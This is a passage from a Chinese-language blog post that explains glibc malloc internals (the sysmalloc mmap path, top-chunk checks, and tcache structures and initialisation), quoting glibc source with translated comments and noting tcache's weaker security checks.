dynamically</span></span><br><span class="line"><span class="comment">  adjusted MMAP_THRESHOLD.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MMAP_THRESHOLD_MIN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="comment">/* For 32-bit platforms we cannot increase the maximum mmap</span></span><br><span class="line"><span class="comment">   threshold much because it is also the minimum value for the</span></span><br><span class="line"><span class="comment">   maximum heap size and its alignment.  Going above 512k (i.e., 1M</span></span><br><span class="line"><span class="comment">   for new heaps) wastes too much address space.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long))</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>下面为这部分代码，目前不是我们关心的重点，<strong>可以暂时跳过</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">   the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">   allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">   rather than expanding top.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span> ||</span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">     (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;</span><br><span class="line">  <span class="type">char</span> *mm; <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">try_mmap:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Round up size to nearest page.  For mmapped chunks, the overhead</span></span><br><span class="line"><span class="comment">     is one SIZE_SZ unit larger than for normal chunks, because there</span></span><br><span class="line"><span class="comment">     is no following chunk whose prev_size field could be used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     See the front_misalign handling below, for glibc there is no</span></span><br><span class="line"><span class="comment">     need for further alignments unless we have have high alignment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    size = ALIGN_UP(nb + SIZE_SZ, pagesize);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</span><br><span class="line">  tried_mmap = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line">    mm = (<span class="type">char</span> *)(MMAP(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mm != MAP_FAILED) &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         The offset to the start of the mmapped region is stored</span></span><br><span class="line"><span class="comment">         in the prev_size field of the chunk. This allows us to adjust</span></span><br><span class="line"><span class="comment">         returned start address to meet alignment requirements here</span></span><br><span class="line"><span class="comment">         and in memalign(), and still be able to compute proper</span></span><br><span class="line"><span class="comment">         address argument for later munmap in free() and realloc().</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ) &#123;</span><br><span class="line">        <span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment">           MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span></span><br><span class="line"><span class="comment">           aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br><span class="line">        assert(((INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">        front_misalign = <span class="number">0</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">      <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">        p = (mchunkptr)(mm + correction);</span><br><span class="line">        set_prev_size(p, correction);</span><br><span class="line">        set_head(p, (size - correction) | IS_MMAPPED);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = (mchunkptr)mm;</span><br><span class="line">        set_prev_size(p, <span class="number">0</span>);</span><br><span class="line">        set_head(p, size | IS_MMAPPED);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* update statistics */</span></span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> new = atomic_exchange_and_add(&amp;mp_.n_mmaps, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="type">atomic_max</span>(&amp;mp_.max_n_mmaps, new);</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">long</span> sum;</span><br><span class="line">      sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">      <span class="type">atomic_max</span>(&amp;mp_.max_mmapped_mem, sum);</span><br><span class="line"></span><br><span class="line">      check_chunk(av, p);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="mmap-失败或者未分配堆"><a href="#mmap-失败或者未分配堆" class="headerlink" title="mmap 失败或者未分配堆"></a>mmap 失败或者未分配堆</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas and mmap also failed.  */</span></span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>如果是这两种情况中的任何一种，其实就可以退出了。。</p><h5 id="记录旧堆信息"><a href="#记录旧堆信息" class="headerlink" title="记录旧堆信息"></a>记录旧堆信息</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"><span class="comment">/* 记录传入的 top 的配置信息 */</span></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize(old_top);</span><br><span class="line">old_end = (<span class="type">char</span> *)(chunk_at_offset(old_top, old_size));</span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *)(MORECORE_FAILURE);</span><br></pre></td></tr></table></figure><h5 id="检查旧堆信息-1"><a href="#检查旧堆信息-1" class="headerlink" title="检查旧堆信息 1"></a>检查旧堆信息 1</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   如果不是第一次执行，我们要求 old_size 至少为 MINSIZE，并且设置了 prev_inuse。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp;</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>)old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这个检查要求满足其中任何一个条件</p><ol><li><code>old_top == initial_top(av) &amp;&amp; old_size == 0</code>，即如果是第一次的话，堆的大小需要是 0。</li><li>新的堆，那么<ol><li><code>(unsigned long)(old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top)</code>，堆的大小应该不小于 <code>MINSIZE</code>，并且前一个堆块应该处于使用中。</li><li><code>((unsigned long)old_end &amp; (pagesize - 1)) == 0)</code>，堆的结束地址应该是页对齐的，由于页对齐的大小默认是 0x1000，所以低 12 个比特需要为 0。</li></ol></li></ol><h5 id="检查旧堆信息-2"><a href="#检查旧堆信息-2" class="headerlink" title="检查旧堆信息 2"></a>检查旧堆信息 2</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert((<span class="type">unsigned</span> <span class="type">long</span>)(old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>根据 malloc 中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *_int_malloc(mstate av, <span class="type">size_t</span> bytes) &#123;</span><br><span class="line">    INTERNAL_SIZE_T nb;  <span class="comment">/* normalized request size */</span></span><br></pre></td></tr></table></figure><p><code>nb</code> 应该是已经加上 chunk 头部的字节，为什么还要加上 <code>MINSIZE</code>呢？这是因为 top chunk 的大小应该至少预留 MINSIZE 空间，以便于合并。</p><h3 id="tcache-gblic-2-26"><a href="#tcache-gblic-2-26" class="headerlink" title="tcache(gblic&gt;&#x3D;2.26)"></a>tcache(gblic&gt;&#x3D;2.26)</h3><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术（see <a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">commit</a>），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p><blockquote><p>主要参考了 glibc 源码，angelboy 的 slide 以及 tukan.farm，链接都放在最后了。</p></blockquote><h4 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h4><p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p><p>这其实和 fastbin 很像，但又不一样。</p><h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="comment">/* 当块存储在每个线程的缓存中时，我们将此结构叠加在块的用户数据部分上。 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p><code>tcache_entry</code> 用于<strong>链接空闲的 chunk 结构体</strong>，其中的 <code>next</code> 指针指向<strong>下一个大小相同</strong>的 chunk。</p><p>需要注意的是这里的 next <strong>指向 chunk 的 user data</strong>，而 fastbin 的 fd 指向 chunk 开头的地址。</p><p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">每个线程都有一个这样的结构，其中包含每个线程的缓存（因此称为 &quot;tcache_perthread_struct&quot;）。保持整体大小较小略为重要。请注意，COUNTS 和 ENTRIES 是冗余的（我们每次都可以计算链表的长度），这是出于性能考虑。 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p><ul><li><strong><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</strong></li><li><strong><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</strong>（为了在tcache中保持较小的内存开销和更好的性能，可能在不同libc上有不同的限制，例如较早版本有的4或者8）</li></ul><p>用图表示大概是：<strong>（next指针存在fd区域）</strong></p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212592.jpeg" alt="img" style="zoom: 67%;" /><h4 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h4><ul><li><strong>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</strong></li><li>free 内存，且 size 小于 small bin size 时</li><li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li><li>tcache 后：<ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li>先从 tcache 取 chunk，直到 tcache 为空</li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul><h4 id="Tcache的相关知识"><a href="#Tcache的相关知识" class="headerlink" title="Tcache的相关知识"></a>Tcache的相关知识</h4><p>在32位系统中，bin会存放12-512字节的chunk，<strong>在64位系统中bin会存放24-1032字节的chunk</strong>。也就是说<strong>符合这些大小的chunk被释放后不会先加入fastbin</strong>，而是会先放入TcacheBin中。**(和fastbin的存储大小差不多一致)**</p><p>TcacheBin以单链表构成</p><h5 id="什么时候用到Tcache："><a href="#什么时候用到Tcache：" class="headerlink" title="什么时候用到Tcache："></a>什么时候用到Tcache：</h5><p><strong>free：</strong>在释放chunk的时候，如果chunk符合Tcachebin的大小，并且该bin还没有被装满(没有七个)，则会优先放入TcacheBin中</p><p><strong>malloc：</strong></p><ol><li>当我们使用malloc的时候，返回一个chunk，并且该chunk是从fastbin中返回的，那么该chunk所对应下标的所有chunk都会被放入TcacheBin(当然，前提是Tcachebin没有被装满)，而且由于fastbin和Tcachebin都是先进后出，所以就会导致chunk在移动完以后chunk的顺序和fastbin中的顺序相反。</li><li>smallbin中的也一样，返回的一个chunk属于smallbin，那么smallbin中对应的chunk就会全部放入Tcachebin(前提是没有装满)</li><li>当出现堆块的合并等其它情况的时候，每一个符合条件的chunk都会优先放入TcacheBin中，而不是直接返回(除非Tcache已满)。寻找结束后Tcache会返回其中一个</li></ol><p><strong>比较重要的一点，当我们调用malloc的时候，其实是先调用libc_malloc然后调用int_malloc，但是如果我们请求的大小在Tcachebin中有符合的chunk那么就会在libc_malloc中返回该chunk，而不会调用int_malloc</strong></p><p><strong>我们在处理chunk的过程中，如果在Tcache中的chunk已满，那么会直接返回最后一个chunk；binning code 结束后，如果没有直接返回（如上），那么如果有至少一个符合要求的 chunk 被找到，则返回最后一个。</strong></p><p><strong>tcache 中的 chunk 不会被合并，无论是相邻 chunk，还是 chunk 和 top chunk。因为这些 chunk 会被标记为 inuse。</strong></p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>接下来从源码的角度分析一下 tcache。</p><h5 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h5><p>第一次 malloc 时，会进入到 <code>MAYBE_INIT_TCACHE ()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="comment">/*int_free 函数还会调用 request2size 函数，请注意不要重复进行填充。(提醒开发者在释放内存块时，注意在调用 request2size 函数时避免重复进行填充操作)*/</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span></span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">//tbytes应该是对应tcache的大小</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">//计算下标</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();  <span class="comment">//检查当前线程的 tcache 是否已经初始化，如果没有初始化，则进行初始化</span></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;  <span class="comment">//在编译器诊断信息中添加一个注释没有实质性作用</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="comment">// 根据 size 得到的 idx 在合法的范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// tcache-&gt;entries[tc_idx] 有 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>附:arena是一块连续的内存区域(包括Heap Arena[Small bin and Large bin]和Thread-specific Arena[Fast bin and Tcache])</p><p>其中 **<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code>**，直接查看 <code>tcache_init()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">tcache_init(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)  <span class="comment">//没有可用的arena或者没有申请chunk成功</span></span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);    <span class="comment">//重试</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);        <span class="comment">//重试</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);       <span class="comment">//解锁arena</span></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="comment">/* 在内存紧张的情况下，我们可能无法分配内存 - 在这种情况下，我们稍后会继续尝试。</span></span><br><span class="line"><span class="comment">   不过，通常我们会在很早的阶段进行这个尝试，</span></span><br><span class="line"><span class="comment">   因此要么有足够的内存，要么根本没有足够的内存来进行非平凡的分配操作。 </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tcache_init()</code> 成功返回后，<code>tcache_perthread_struct</code> 就被成功建立了。</p><h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><p>接下来将进入申请内存的步骤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// 由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);   <span class="comment">//tcache为空就直接_int_malloc</span></span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p><h4 id="tcache-get"><a href="#tcache-get" class="headerlink" 